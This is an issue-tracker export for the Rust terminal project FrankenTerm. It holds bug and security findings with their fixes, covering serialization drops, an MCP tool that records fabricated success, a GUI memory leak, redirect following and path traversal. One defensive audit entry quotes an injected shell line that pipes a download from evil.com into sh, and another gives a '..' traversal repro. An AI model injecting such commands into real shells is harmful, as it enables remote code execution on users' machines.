The ft-xbnl0.2.4-scoped files (`src/distributed.rs`, `src/metrics.rs`,
`src/runtime_compat.rs`, `tests/web.rs`, `tests/ft_xbnl0_2_4_*.rs`) produce
zero clippy warnings.

See: `docs/ft-xbnl0-2-4-completion-evidence.md §6.1.1`.

title: [OBS] ars_federation.rs:259 to_generic_payload silently drops serde failure via unwrap_or_default
description:
Audit of crates/frankenterm-core-ars/src/ars_federation.rs at SHA 5d58bf14f found one silent serde drop in the webhook payload formatting path.

## Site

`crates/frankenterm-core-ars/src/ars_federation.rs:258-260`:

```rust
/// Format as generic webhook payload.
pub fn to_generic_payload(&self) -> String {
    serde_json::to_string(self).unwrap_or_default()
}
```

On serde_json::to_string failure, the function silently substitutes empty string. The webhook delivery pipeline then sends an empty body to the remote receiver — looking like a successful delivery but carrying no data.

## Why it matters

Same observability defect family as ft-yygus (policy decision_context serialize-drop counter), ft-zkthg (replay capture serde drop), ft-jyywz (audit chain export drop), ft-rnpuc (mcp clock anomaly), ft-95fd3 (SSE drop counter). Webhook delivery is operator-facing — a silent empty payload defeats federation observability.

In practice serde on the federation payload type rarely fails (typed struct over primitives), but the absorption pattern is a code smell and the observability gap is real.

## Suggested remediation

Two options:

**Option A** (preferred — matches established pattern): replace unwrap_or_default with explicit match. On Err, bump a process-global counter (ARS_FEDERATION_PAYLOAD_SERDE_DROP_COUNT, same shape as POLICY_DECISION_CONTEXT_SERDE_DROP_COUNT from ft-yygus) + emit structured tracing::warn (target ft.ars.federation, event payload_serde_drop) + return empty string (preserve existing recording behavior).

**Option B** (smaller): replace unwrap_or_default with .expect() since the Serialize impl is infallible for the typed struct. Same shape as ft-zkthg HIGH-tier fixes (tx_idempotency.rs:175). Failure would surface a future-refactor breakage loudly at the call site rather than silently corrupting downstream webhook bodies.

Recommended: Option B is simplest if the Serialize derive is genuinely infallible (typed struct over primitives + String + nested serializable structs); Option A if observability is the priority.

## Acceptance

- Replace unwrap_or_default with chosen option
- Add regression test: clean payload roundtrips; (Option A) counter starts at 0 + bumps on forced-failure; (Option B) panic message names the type
- Doc comment explaining the choice
notes: Counter + tracing::warn shipped at bc937daf7 (Option A — observability-first approach from bead spec). to_generic_payload now bumps ARS_FEDERATION_PAYLOAD_SERDE_DROP_COUNT and emits structured warn with cluster_id + reflex_id + error context. 4 unit tests + 1 proptest pass. Drive-by build fix at 4ac66f9ac unblocked ars test target (SymbolicSafety regression from a21c643d1). Same audit-fidelity family as ft-iwg7x/ft-zkthg/ft-jyywz/ft-yygus/ft-rnpuc/ft-bn6qi/ft-ncijf/ft-r3d4e.

title: ft-jwst6 substrate: KittyCompositorHealth::is_safe doc claims DecodeAsync render-thread check, impl only checks rejection ratio
description:
kitty_graphics_compositor.rs KittyCompositorHealth::is_safe docstring says:

> True iff rejection rate is healthy (≤5%) AND no DecodeAsync was misclassified onto the render thread.

But the implementation only checks the rejection ratio. The 'DecodeAsync misclassified' condition is never verified — there's no field tracking it.

Two fix options:
1. Add a misclassified_decode_async_count field; record_frame_budget_op flags any call where op=DecodeAsync && runs_on_render_thread()==true. is_safe checks count==0.
2. Update docstring to match implementation (drop the second clause).

Option 1 is the better fix — the bead's 'decode async, off render thread' is a hard rule and substrate should expose a way to verify it.

Tracked under self-review pass.
close_reason: Fixed at HEAD: misclassified_decode_async_count field added; record_op_on_render_thread helper increments for DecodeAsync; is_safe checks both rejection ratio AND count==0. 2 regression tests pin both branches.

title: policy_audit_chain.rs export_json/export_jsonl silently drop serialization failures
description:
policy_audit_chain.rs export_json (line 520) and export_jsonl (line 528) silently absorb serde_json serialization failures:

- export_json: serde_json::to_string_pretty(&entries).unwrap_or_default() returns empty string on failure.
- export_jsonl: filter_map(|e| serde_json::to_string(e).ok()) silently drops entries that fail to serialize, joining the surviving ones.

Both still increment self.telemetry.exports_completed even when the export is incomplete or empty — operators see exports_completed=N+1 but the actual exported audit chain may be missing entries with no signal that any were dropped.

In practice serde_json on a Vec<&AuditChainEntry> never fails since AuditChainEntry derives Serialize from primitive fields. But the unwrap_or_default + filter_map.ok() pattern is a code smell — it absorbs failures that should be observable for tamper-evidence purposes (the WHOLE POINT of the audit chain is tamper-evidence; a silently truncated export defeats that).

Fix shape: add audit_chain_export_dropped_count AtomicU64 + accessor + cfg(test) reset, bump in export_json on Err, bump in export_jsonl per filter_map None. Same shape as 18 prior poison-recovery counters.

Cross-references: The chain itself is sound (verify_chain_continuity + verifications_run/verification_failures counters are well-instrumented). Only the EXPORT path lacks observability.
notes: Counter shipped at dc5b42a8c. audit_chain_export_dropped_count + accessor + reset_for_test, bumped at both export_json (unwrap_or_default replaced) and export_jsonl (filter_map(.ok()) replaced with explicit loop). 3 tests pass on policy-types crate; parent frankenterm-core lib check clean.

title: [MEDIUM] TimeSeries::percentile(NaN) returns smallest value instead of None
description:
# Defect

`crates/frankenterm-core/src/time_series.rs:239` — `TimeSeries::percentile_range` (and the `percentile` convenience that delegates to it).

Same class as ft-b4l62 (telemetry Histogram::quantile, fixed 2c7b891c). The function relies on `p.clamp(0.0, 1.0)` to validate its input, but `f64::clamp(NaN, _, _)` returns NaN (documented Rust behaviour), so a NaN `p` cascades through:

```rust
let p = p.clamp(0.0, 1.0);                          // NaN stays NaN
let idx = ((values.len() - 1) as f64 * p)           // NaN
    .round() as usize;                              // NaN as usize = 0
Some(values[idx])                                   // smallest value
```

A NaN quantile arg silently returns the smallest sample — a plausible-looking number that has no relationship to the requested percentile. Pre-fix the Histogram analog had the same bug; the fix pattern is identical.

## Fix

```rust
if values.is_empty() || p.is_nan() {
    return None;
}
```

Matches the ft-b4l62 disposition: NaN `p` is explicitly `None` rather than a silently-wrong small value.

## Tests

* `ft_jz40p_percentile_nan_returns_none` — pins None return for NaN p.
* `ft_jz40p_percentile_infinity_inputs_still_work` — regression: ±inf still clamp to 0.0/1.0 and return min/max samples (pre-existing contract, not broken by the new NaN guard).

## Scope

Single file (`time_series.rs`).
close_reason: Fix and both regression tests already landed (time_series.rs:246-254 + :720-745). percentile_range now guards with 'if values.is_empty() || p.is_nan() { return None; }' at line 252, so percentile(NaN) returns None instead of silently returning the smallest sample via NaN-clamp-to-0 → (NaN as usize)==0 cascade. Regression tests: ft_jz40p_percentile_nan_returns_none (NaN→None on both percentile + percentile_range, plus sanity check that valid p=0.5 still works) and ft_jz40p_percentile_infinity_inputs_still_work (±inf continue clamping to 0.0/1.0 → min/max sample, pre-existing contract preserved). Verified: 38 time_series:: tests passed, 0 failed.

title: [modes-of-reasoning][resource-vs-logical-lifecycle] 21+ Drop impls scattered across modules; cleanup ordering on cancel-mid-flight is undefined
description:
## Perspective: resource lifecycle vs logical lifecycle

Rust's RAII gives every type a Drop hook. A complex async system
has TWO lifecycle clocks:

- **Resource lifecycle** — when does memory/file/socket/lock
  reclamation run? (Drop ordering, lexical scope.)
- **Logical lifecycle** — when does the SESSION/MISSION/Cx
  consider itself finished? (cancellation, completion, error.)

These are NOT the same. A canceled mid-flight Cx triggers Drop
in lexical scope order, but the SEMANTIC ordering (audit-trail
flushed before storage closes; replay capture finalized before
recorder shuts down; semantic-watchdog snapshot taken before
data structures dropped) is undefined.

`crates/frankenterm-core/` has Drop impls in at least:

| File | Drop count |
|------|-----------:|
| `spsc_ring_buffer.rs` | 4 |
| `mcp_tools.rs` | 3 |
| `cancellation_safe_channel.rs` | 2 |
| `telemetry.rs` | 1 |
| `storage.rs` | 1 |
| `snapshot_engine.rs` | 1 |
| `semantic_anomaly_watchdog.rs` | 1 |
| `safe_channel.rs` | 1 |
| `runtime.rs` | 1 |
| `runtime_async.rs` | 1 |

(Total ≥21 visible from grep. Likely more across other modules.)

There is no central registry of Drop ordering, no documented
dependencies between Drop impls, no test that exercises
"cancel-mid-flight at every step of a 50-step workflow and
verify finalization invariants hold." MEMORY.md's
`asupersync-midflight-cancel-gap` note hints at this — recv/
acquire primitives observe pre-cancel but not mid-flight.

## Why this is a real architectural concern

Concrete failure modes this lens predicts:

1. **Audit trail truncated by cancel.** A Cx canceled while
   `recorder_audit::append_entry()` is in flight: the in-memory
   buffer Drop runs in lexical order; if it drops BEFORE the
   storage backend's Drop, the buffer's pending writes are lost.
   No test asserts this doesn't happen.

2. **Snapshot replay diverges by 1 event.** A canceled workflow's
   final "abort" event isn't recorded because the SnapshotEngine
   Drop runs before the workflow Drop (or vice versa). Replay of
   the canceled session shows N-1 events, not N.

3. **Semantic-anomaly-watchdog signature stale.** The watchdog
   maintains a per-pane fingerprint; when the pane Drop runs first,
   the watchdog's last-known signature is for a freed pane, until
   GC reaps it. Brief, but real.

4. **Channel close ordering** — `safe_channel` and
   `cancellation_safe_channel` have different Drop semantics
   (the latter is documented to drain on Drop; the former isn't).
   Whether a sender or receiver Drop happens first determines
   whether the receiver sees `Closed` vs blocks forever — that
   ordering is implicit and can flip with refactoring.

The skill's resource/logical-lifecycle lens is exactly what makes
these visible. From inside a single Drop impl, everything looks
correct; from the system view, the graph of inter-Drop dependencies
is undocumented.

## Suggested approach

1. **Drop dependency graph** — author
   `docs/drop-ordering-contract.md` listing every Drop impl in
   `frankenterm-core` and its required predecessors (e.g.,
   "RecorderAudit::Drop must complete before Storage::Drop").

2. **Define a session shutdown protocol** — a `SessionShutdown`
   trait + `shutdown(Cx) -> impl Future<Output=()>` async method
   on the top-level lifecycle types. Drop becomes the FALLBACK
   (best-effort cleanup); explicit `shutdown(Cx)` is the primary
   path.

3. **Test cancel-mid-flight invariants** —
   `tests/cancel_invariants_at_each_step.rs`: drive a 50-step
   workflow, cancel at each step boundary, assert:
   - Audit trail records the cancel event.
   - Recorder events are flushed.
   - Replay of the canceled session yields exactly the events
     that completed before cancel.

4. **Document the lexical-scope Drop pattern as fallback only**
   — in AGENTS.md or a sibling doc, a "Drop is best-effort,
   shutdown(Cx) is the contract" rule.

## Out of scope

- Refactoring every Drop into shutdown() (large, multi-PR work).
- The asupersync runtime itself (it's load-bearing infrastructure
  per AGENTS.md).
- The cancel-mid-flight asymmetry MEMORY.md note tracks
  separately (different angle: this bead is about Drop ordering,
  that note is about primitive observability of the cancel
  signal).

## Acceptance criteria

- `docs/drop-ordering-contract.md` lists every Drop in
  `frankenterm-core`.
- A `SessionShutdown` trait + at least one consumer (recorder,
  storage, or snapshot engine) prototype exists.
- `tests/cancel_invariants_at_each_step.rs` exists with at least
  10 step boundaries and 3 invariant assertions per step.
- AGENTS.md gains a rule "Drop is best-effort; explicit shutdown
  is the contract".

## References

- `grep -rcE "impl Drop for " crates/frankenterm-core/src/*.rs`
  (the 21+ Drop impls)
- MEMORY.md `asupersync-midflight-cancel-gap` (related but
  different lens)
- README §Platform Model (cancel-correctness contract that
  this lens shows is incompletely realized at the Drop level)
- Skill: modes-of-reasoning — resource/logical-lifecycle is
  a "different axes" disagreement-resolution case, often
  invisible from inside any single module

Filed by cc_1 modes-of-reasoning audit, 2026-04-28.
close_reason: documented Drop lifecycle audit and filed high-risk follow-on beads

title: [BR-RC-DOCTRINE.G1.1.adopt.workflows.subset2] RuntimeProof adoption — author missing _with_cx siblings (6 sites)

title: [tx][integrity][P1] wa.tx_run evaluates synthetic (allow-all + always-success) inputs and persists fabricated Committed state to the tx contract file
description:
## Finding

The production MCP tool `wa.tx_run` at `crates/frankenterm-core/src/mcp_tools.rs:2985-3186` runs its prepare/commit/compensate pipeline on **synthetic inputs**, not on real executor outputs. It then persists the synthetic-success results to the tx contract file on disk.

### Call sequence

1. `wa.tx_run` handler loads the MissionTxContract from disk.
2. `let gate_inputs = mcp_build_tx_prepare_gate_inputs(&contract);` at :3089. Under the alias in mcp.rs:56 this resolves to `crate::plan::tx_prepare_gate_inputs_allow_all(contract)` — a helper at plan.rs:3438 that hardcodes `policy_passed: true`, `reservation_available: true`, `approval_satisfied: true`, `target_liveness: true` for every step.
3. `evaluate_prepare_phase` is fed those all-true inputs and returns AllReady.
4. `let commit_inputs = mcp_build_tx_commit_step_inputs(...)` at :3121 resolves to `mission_tx_commit_step_inputs` at plan.rs:3571, which hardcodes `success: true` for every step unless the caller explicitly passes `fail_step`.
5. Same for compensation.
6. The resulting `TxCommitReport` / `TxCompensationReport` is written back to the contract file via `mcp_save_mission_tx_contract_to_path` at :3186 with `lifecycle_state` set to the target (typically Committed) and receipts populated.

### Impact

- The MCP tool description at :2990 says "Execute deterministic tx prepare+commit and compensation on partial failure (robot parity)" — operators reasonably infer real execution.
- A peer agent invoking `wa.tx_run` on a contract with (e.g.) a step that SHOULD fail policy gating will see the contract transition to Committed on disk without any real policy check having fired.
- A downstream tool that queries the tx contract file (`wa.tx_show --include-contract`, operator dashboards, audit exports) will see a fabricated success state. The audit log will record the transitions without any runtime evidence that the underlying steps happened.
- The REAL executor infrastructure (`PaneStepExecutor` at tx_execution.rs:234, `TxExecutionEngine` at :731) is grep-verified to NOT be called from the MCP path (zero matches for either type in mcp_tools.rs). They exist but are unused by wa.tx_run.

### Related beads (context)

- ft-bekwl + ft-npj7t (both closed) fixed a parallel 'synthetic success in compensation' path in `PaneStepExecutor`. This bead is DIFFERENT: the MCP handler doesn't use `PaneStepExecutor` at all.
- ft-73f9r added an e2e test for wa.tx plan/run/rollback. That test validates deterministic-synthetic behavior, not real-executor behavior — so it doesn't catch this gap.

### Fix direction

The correct call sequence for `wa.tx_run` is:
1. Build a real `PaneStepExecutor` (needs wezterm handle, reservation manager, policy engine with rate limiter, storage).
2. Call `PaneStepExecutor::evaluate_gates(contract, now_ms)` for real prepare inputs.
3. Feed those to `evaluate_prepare_phase`.
4. If prepare passes, call `PaneStepExecutor::execute_steps(contract, fail_step, now_ms)` for real commit inputs.
5. Feed those to `execute_commit_phase`.
6. If commit fails partially, call `PaneStepExecutor::execute_compensations(contract, &commit, fail_for_step, now_ms)` and feed to `execute_compensation_phase`.

This is a substantial refactor: the MCP handler currently has neither the wezterm handle, reservation manager, nor policy engine in the right shape. Approximate size: ~150-200 LoC + per-step executor wiring.

### Interim mitigation

Until the real executor is wired, `wa.tx_run` should either:
(a) Return a clear 'simulation' marker in the envelope (e.g., `data.mode: "synthetic_preview"`) and refuse to persist lifecycle_state changes back to the contract file, OR
(b) Be gated behind an explicit `--simulate` flag and error when called without it.

(a) is the smaller diff and preserves current e2e tests. (b) is more operator-clear but breaks the tool's default behavior.

### Severity rationale

P1 (not P0):
- No direct remote exploitation path: MCP ships over stdio/localhost by default and `wa.tx_run` is already gated by `mcp_authorize_mcp_mutation` per ft-x86z2 (so it's behind policy auth).
- But the persisted synthetic-success state on disk is a real data-integrity hazard for any operator reading the tx contract file as authoritative.

Surfaced by RusticMeadow during /multi-pass-bug-hunting pass on tx subsystem, 2026-04-23.
close_reason: Shipped in b7b44081: wa.tx_run now goes through real executor (no synthetic allow-all)

title: [mor:performance-engineering] storage.rs at 31k lines — is FTS5 indexing synchronous on the capture path?
description:
# Observation

storage.rs is 31,648 lines (largest module in the core crate). It
owns a SQLite connection with WAL, drives FTS5 virtual tables for
the lexical-search surface, and handles retention sweeps
(\`database_stats(..., retention_days)\` at line 3758).

FTS5 writes are expensive — they rebuild inverted-index pages on
INSERT/UPDATE. If the capture path writes rows AND the FTS5 trigger
runs synchronously in the same transaction, every captured segment
pays the indexing cost before the write returns, which is pushed
onto the hot path at the very point where backpressure is trying
to keep up.

Not verified in this pass — just the shape of the concern given
the size of storage.rs and the presence of FTS5. Worth a targeted
read of the capture-write code path.

# Question

Three measurements that would clarify whether this matters:

1. Is there a "defer FTS5 indexing to a background task" path, or
   do FTS5 triggers fire in the capture-write transaction?
2. What's the p99 latency of \`insert_pane_output\` under a 200-pane
   load with FTS5 enabled vs disabled?
3. Is there an async/batch FTS5 index-catchup task that operators
   can offload indexing to?

If (1) is "synchronous" and (2) shows meaningful gap between
enabled/disabled, then an async-index mode is probably the fattest
win in the capture subsystem. Memory budget permits: a lag of
seconds in search freshness is almost always an acceptable trade
for linear-capture throughput during incidents.

# Structural note

31k lines in one module suggests the subsystem has grown through
absorption rather than redesign. Might be worth sketching the
module boundaries as a separate planning exercise before
optimizing; "where does latency go when we write a segment" is a
question that should have a one-page answer.
close_reason: Answered. Q1 (sync or async?): SYNCHRONOUS — three AFTER INSERT/DELETE/UPDATE triggers at storage.rs:169-180 fire inside every append_segment_sync transaction (storage.rs:12308). Q2 (p99 measurement): not run — needs a load harness. Q3 (async catchup available?): infrastructure EXISTS (fts_pane_progress table storage.rs:472 + sync_fts_on_startup storage.rs:16131 + FtsSyncConfig storage.rs:2363) but is wired only for startup recovery and explicit rebuild, NOT for live capture. Follow-up for the actual move-to-deferred work filed as ft-wk5fo with concrete plan + risk notes + measurement prerequisite.

title: wezterm-gui leak: redundant compute_tab_title second pass amplifies allocations
description:
## Symptom

Local mac wezterm-gui RSS grew at sustained ~33 MB/sec under normal use with 5 attached remote muxes (trj/css/csd/ts1/ts2), reaching 30+ GB before being killed. Required `sudo purge` and full GUI restart to recover. Reproduces in upstream wezterm-gui (not frankenterm-specific divergence).

## Profiling evidence

`sample(1)` of running wezterm-gui pid 99502 (~13 GB RSS at sample time) showed **33% of samples** in `compute_tab_title`, called from this stack:

```
TermWindow::dispatch_window_event → dispatch_notif → update_title → update_title_impl
  → TabBarState::new → compute_tab_title
```

## Root cause #1 — redundant compute_tab_title second pass

`tabbar.rs:387-399` builds a `tab_titles: Vec<TitleText>` by calling `compute_tab_title(...,  hover=false, max=config.tab_max_width)` for every tab. Then `tabbar.rs:462-469` re-calls `compute_tab_title(..., hover=hover, max=tab_title_len)` with different args, **invalidating the first pass cache**.

In `use_fancy_tab_bar` mode, `tab_title_len == config.tab_max_width == usize::MAX`. So when the user is not hovering, the second call is *strictly redundant* — same args, full Lua roundtrip + tab/pane clones + parse_status_text re-execution.

## Allocation amplification per call

`call_format_tab_title` (tabbar.rs:53-96) per invocation:
1. `lua.create_sequence_from(tab_info.iter().cloned())` — clones every TabInformation including `Option<PaneInformation>` containing `HashMap<String,String> user_vars`
2. `lua.create_sequence_from(pane_info.iter().cloned())` — clones every PaneInformation × user_vars HashMap
3. Calls `format-tab-title` Lua handler
4. `parse_status_text` builds Vec<Cell> per call (each Cell ~56B + CellAttributes HashMap)

Plus tabbar.rs:481 `format_as_escapes(tab_title.items.clone())` reparse.

With N=10 tabs, ~30 panes, 2× call rate: ~36k Cell allocations/second under load. Combined with mlua incremental GC unable to keep up under bursty Alert load = sustained malloc fragmentation = unbounded RSS.

## Fix

Cache the first-pass result; only recompute on the second pass when args genuinely differ:

```rust
let tab_title = if hover || tab_title_len != config.tab_max_width {
    compute_tab_title(&tab_info[tab_idx], tab_info, pane_info, config, hover, tab_title_len)
} else {
    tab_titles[tab_idx].clone()
};
```

Halves Lua callbacks per `update_title_impl` for fancy tab bar users.

## Risk

Low. Behavior is preserved when args differ (hover, custom width). Only the redundant path is short-circuited.

## Validation

`metrics::counter!("compute_tab_title.calls")` should drop ~50% after fix.

## Cross-reference

Pairs with separate ticket on `update_title` not coalescing per-Alert (the *rate* problem), and ticket on enabling jemalloc by default (the *fragmentation* multiplier).

title: [MEDIUM] launch_agent pipes restored `command` into shell via send_text without CR/LF sanitization
description:
Found during /security-audit-for-saas pass #4 (pane 5, 2026-04-21).

## Summary
`restore_process.rs::launch_agent_legacy` (line 625) and
`launch_agent_cx` (line 648) build the command string for a restored
pane by `format!("{command}\r", ...)` and then sending it to the
pane shell via `self.wezterm.send_text(pane_id, &full_cmd)`. The
pane shell is an active interactive shell (not an argv-isolated
subprocess), so any `\r` or `\n` in `command` injects additional
lines into the shell's input buffer.

## Evidence
- crates/frankenterm-core/src/restore_process.rs:625
  ```rust
  async fn launch_agent_legacy(
      &self,
      pane_id: u64,
      command: &str,          // <- from RestoredPaneState.command
      cwd: &Path,
      agent_type: &str,
  ) -> Result<(), String> {
      let cd_cmd = format!("cd {}\r", shell_escape(cwd));
      self.wezterm.send_text(pane_id, &cd_cmd).await...;
      ...
      let full_cmd = format!("{command}\r");   // <- unsanitized
      self.wezterm.send_text(pane_id, &full_cmd).await...;
  ```
- crates/frankenterm-core/src/restore_process.rs:648 — the cx-first
  variant has the same shape and the same gap.
- Note the asymmetry: `cwd` IS passed through `shell_escape(cwd)`,
  but `command` is not. The cd helper got the defensive treatment;
  the main command did not.

## Impact / trust boundary
`RestoredPaneState.command` is loaded from the SQLite session DB
at `session_restore.rs:892` where `state.command` is read from the
`mux_pane_state` table. Attack paths requiring this field to be
attacker-controlled:

1. DB write access (already implies full-user compromise; out of
   scope as a net-new threat).
2. Snapshot bundle import from an untrusted source — `ft diag
   bundle` round-trips include session data; if someone shares a
   diag bundle and it gets restored, the imported `command`
   values pass through this path.
3. `ft restart --launch-agents` applied after a targeted
   corruption of `mux_pane_state` rows.

Severity: MEDIUM. Not a remote zero-click — requires an existing
trust-boundary crossing — but the defense-in-depth gap is concrete:
a restored `command` like `claude-code\r curl evil.com/x | sh`
would execute the second line in the user's shell on
`ft restart --launch-agents`.

## Fix direction
1. Quick (defense in depth): reject or strip any `\r`/`\n` from
   `command` before formatting. A restored command that needs
   multi-line input is already broken — the typing model assumes
   one command per restore. Concretely:
   ```rust
   if command.chars().any(|c| matches!(c, '\r' | '\n')) {
       return Err(format!(
           "refusing to launch pane {pane_id}: restored command contains CR/LF"
       ));
   }
   ```
2. Proper (larger): route relaunch through `wezterm cli spawn --`
   with argv-isolated arguments instead of typing into an
   interactive shell. Eliminates shell metacharacter concerns
   entirely.

## Non-gaps verified in the same pass
- Snapshot restore has NO direct `fs::write` / `fs::create_dir`
  path (grep confirmed zero hits in session_restore.rs +
  snapshot_engine.rs). Arbitrary-file-write via restore is not
  reachable today.
- Pattern-pack URL loading: `load_pack_from_id` at patterns.rs:963
  accepts only `builtin:` and `file:` schemes; any other scheme
  returns `PackNotFound`. No HTTP/URL fetch surface. **No SSRF.**
- FTS5 query escaping: user query passes to `MATCH ?1` as a bound
  rusqlite parameter at storage.rs:17486/17496; SQL injection is
  impossible and `validate_fts_query` rejects malformed FTS5 DSL
  cleanly. **Clean.**

## Related
- ft-security-mcp-path-traversal (fixed 30988e53) — same class of
  defense-in-depth gap across the MCP tool surface.
- ft-xv561 (fixed 070117a0) — ReDoS via user-pack regexes.

Filed per /security-audit-for-saas pass #4.
close_reason: Closed by 969b9e02. Added sanitize_restored_command() helper in restore_process.rs that rejects \r/\n/ESC/other C0 controls. Wired into both launch_agent_legacy (line 632) and launch_agent_cx (line 656) before format!({command}\r). 8 unit tests cover legitimate inputs (claude-code, codex resume, env-prefixed, UTF-8), the exact attack payload from the bead (claude-code\ninnocent_payload\r), bare CR/LF, OSC via ESC (\x1b]0;pwned\x07), BEL/NUL, and byte-offset fail-fast ordering. Does NOT route through wezterm cli spawn argv-isolated (documented as follow-up); this closure is the defense-in-depth gate at the sanitizer boundary.

title: DistributedHttpClient must not transparently follow 3xx redirects
description:
# Security: DistributedHttpClient transparent redirect following

## Background
Discovered during ft-xbnl0.2.4 tick 349 verification work. `DistributedHttpClient`
(built on the default asupersync HTTP client config) **follows 3xx redirects
transparently** by default. A 302 with an arbitrary `Location:` header is
followed without caller visibility.

Current behavior is pinned by `distributed_http_client_3xx_redirect_current_behavior_snapshot`
in `crates/frankenterm-core/src/distributed.rs` (tests module) — the test
asserts `Err` on a 302 whose Location is unresolvable, and explicitly
documents that assertion flipping is the trigger for this bead's work.

## Security concern
`DistributedHttpClient` is used for distributed node-to-node RPC (health
checks, event forwarding). Peer URLs are supposed to point at trusted
nodes. Transparent redirect following means:

- A compromised peer can respond `302 Location: http://attacker.com/` →
  next request body is sent to attacker (including event data, pane
  captures, auth tokens).
- Even without compromise, a misconfigured peer with a redirect loop
  could cause unbounded work.

## Fix
Configure `RedirectPolicy::none()` at the `DistributedHttpClient`
construction site — see `crates/frankenterm-core/src/distributed.rs`
around `DistributedHttpClient::new()` and `DistributedHttpClient::plaintext()`.

This forces the caller to explicitly handle (or ignore) the redirect.

## Verification
After the fix:
1. `distributed_http_client_3xx_redirect_current_behavior_snapshot` will
   fail — update it to assert `resp.status == 302` and rename to drop
   the "current-behavior-snapshot" suffix. Rename to
   `distributed_http_client_returns_3xx_redirect_as_ok_response`.
2. Add a second test asserting that a 302 → a different internal host
   is ALSO observable (not followed) — use a second TcpListener in
   the test so the "Location" resolves but the client still doesn't
   follow it.

## Out of scope
- Building a full redirect-following mechanism (if callers want redirects,
  they can opt in explicitly by following the Location themselves after
  inspecting it).
- The asupersync HTTP client's default RedirectPolicy — that's a library
  default and changing it would affect every other caller. The fix is
  to override at the FrankenTerm distributed-client construction site.

## References
- Finding tick: ft-xbnl0.2.4 tick 349 (commit 4013f6e9)
- Related doc: docs/ft-xbnl0-2-4-completion-evidence.md §5 (out of scope carve-out)
close_reason: Completed by tick 351 (commit 4717c434): DistributedHttpClient::new() now constructs via builder with .no_redirects() explicitly. 3xx responses are Ok(Response{status: 3xx}) observable to caller. Snapshot test renamed + flipped to assert Ok(302). All 40 ft-xbnl0.2.4 tests still pass via scripts/check_ft_xbnl0_2_4.sh.

title: tmux_cc::Parser: advance_byte has no per-line buffer cap, attacker-controlled unbounded memory growth
description: frankenterm/escape-parser/src/tmux_cc/mod.rs:858-865 advance_byte pushes every non-newline byte into self.buffer and only processes when '\n' arrives. There is no bound on self.buffer before the newline. MAX_GUARDED_OUTPUT_LEN at line 15 only caps the %begin/%end guarded-output accumulator in process_guarded_line, NOT the pre-line buffer. A tmux session that produces a stream without ever emitting a newline (malicious proxy / buggy tmux) forces the parser to grow self.buffer up to the process's RAM. Same failure shape as ft-phz7x in codec. Fix: add a MAX_LINE_LEN cap (1 MiB is generous — real tmux cc lines are short) and on overflow clear the buffer + drop any active begun-block so subsequent lines don't append to stale state. Emit a log::warn so operators see the rejection.

title: [browser.fix] sanitize_path_component allows '..' and '.' through allowlist, enables path traversal
description:
Security bug found in fresh-eyes review of crates/frankenterm-core/src/browser/mod.rs.

## Defect

sanitize_path_component (browser/mod.rs:350-360) allowlists alphanumeric + '-' + '_' + '.'. Replaces everything else with '_'. But '..' and '.' are valid sequences of allowlisted chars:

    sanitize_path_component('..') = '..'   // unchanged
    sanitize_path_component('.') = '.'     // unchanged

These then flow into BrowserProfile::new -> .path():

    profiles_root.join(&self.service).join(&self.account)

If service='..' and account='secrets':
    profiles_root.join('..').join('secrets')
    = profile_root/../secrets
    = parent_of_profile_root/secrets

PATH TRAVERSAL — the browser profile machinery would create /Users/me/.ft/secrets/ (mode 0700) instead of /Users/me/.ft/browser_profiles/../secrets/.

## Why it matters

BrowserProfile is used for browser automation cookie/storage isolation. An attacker controlling the 'service' or 'account' string (e.g., via deserialization of a saved profile reference) can:
1. Escape the profiles_root containment.
2. Write arbitrary cookies/storage to operator-chosen paths.
3. Potentially overwrite existing files (set_permissions modes the dir, but PathBuf::join + create_dir_all could collide with existing siblings).

## Repro

    let p = BrowserProfile::new('/Users/me/.ft/browser_profiles', '..', 'secrets');
    let path = p.path();
    // path = /Users/me/.ft/secrets — escaped the browser_profiles root

## Fix

After the allowlist filter, reject the result if it equals '..' or '.' or is empty, replacing with '_' or similar safe sentinel.

    let sanitized: String = s.chars().map(|c| ...).collect();
    if sanitized.is_empty() || sanitized == '.' || sanitized == '..' {
        '_'.to_string()
    } else {
        sanitized
    }

Or stricter: reject any path component that begins with '.' (including '.foo' which would hide the dir).

## Acceptance

- sanitize_path_component('..') != '..'
- sanitize_path_component('.') != '.'
- sanitize_path_component('') = '_'
- BrowserProfile::new('..', 'X').path() does not escape profiles_root.
- Existing tests still pass.

## Cross-references

- crates/frankenterm-core/src/browser/mod.rs:344-360 (the buggy fn)
- browser/mod.rs:99-105 (BrowserProfile::new — call site)
- ft-asoso, ft-mc629 (sibling sanitization-gap fixes this review pass)
notes:
Path-traversal security fix landed at commit 74caa6354. sanitize_path_component now rejects bare '..' and '.' (replaces with '_').

5 regression tests landed:
- sanitize_path_component_rejects_bare_double_dot (load-bearing — the actual attack vector)
- sanitize_path_component_rejects_bare_single_dot
- sanitize_path_component_empty (tightened: '' → '_')
- sanitize_path_component_preserves_dot_files_and_versions (sanity: '.hidden', 'v1.2.3', etc still pass)
- profile_path_does_not_escape_root_with_bare_double_dot (end-to-end)

Pattern: 3rd sanitization-gap fix this review pass:
- ft-mc629: alt-text scrub DEL/C1 (closed by another pane)
- ft-asoso: restore_process DEL/C1 (this pane, prior turn)
- ft-klznn (this): browser path-component bare '..'

All three are 'allowlist passes through a special-meaning sequence that defeats the documented protection'. Worth a centralized sanitization helper or audit policy.

title: Black-box incident bundle for swarm triage
description:
Build a FrankenTerm-native incident bundle that captures enough live state to debug massive-agent swarm failures without poking active panes, restarting shared services, or copying sensitive transcripts verbatim.

The bundle should combine redacted robot state, recent pane/tailer health, proof/RCH evidence pointers, resource-pressure snapshots, Beads/coordination state, and platform process diagnostics into a portable archive with deterministic metadata. It is intentionally different from the proof-doctor ledger: this is a black-box capture artifact for incidents where the system is already misbehaving and the operator needs a shareable, privacy-bounded triage package.

Non-goals: no Agent Mail repair, no daemon restarts, no destructive cleanup, no broad resource cockpit rewrite, no proof scheduler changes.
design:
Shape this as a product surface, not a one-off shell script. Preferred API shape is a typed library collector plus a robot/operator command that writes a single bundle directory or archive with manifest.json, redacted source payloads, warnings.jsonl, and provenance.

The collector should call existing FrankenTerm surfaces rather than spawn fragile ad hoc commands where internal APIs exist. Platform diagnostics are optional plug-ins behind privacy tiers and bounded timeouts. Every payload needs source name, collection time, result status, redaction policy, and enough provenance for a remote reviewer to know whether data is live, fixture-derived, or unavailable.
acceptance_criteria:
- No direct overlap with proof-doctor, resource cockpit, terminal corpus, capture fairness, fleet mutation, or RCH rollout beads.
- Epic has contract, collector, sampler, fixtures, verifier, and handoff proof children with explicit dependencies.
- All implementation children require non-destructive, read-only collection and typed degradation.
